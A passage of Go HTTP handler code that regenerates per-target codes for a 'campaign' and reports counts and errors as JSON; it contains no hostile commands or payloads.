	writeJSON(w, 200, map[string]string{"status": "launched"})
}

func (h *Handler) regenCode(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	if err := h.Manager.RegenerateCode(id, targetID); err != nil {
		writeError(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "regenerated"})
}

func (h *Handler) regenAll(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}
	allTargets := c.Targets.All()
	regenerated := 0
	var errs []string
	for _, t := range allTargets {
		if err := h.Manager.RegenerateCode(id, t.ID); err != nil {
			errs = append(errs, fmt.Sprintf("%s: %s", t.ID, err.Error()))
		} else {
			regenerated++
		}
	}
	writeJSON(w, 200, map[string]interface{}{
		"regenerated": regenerated,
		"errors":      errs,
	})
}
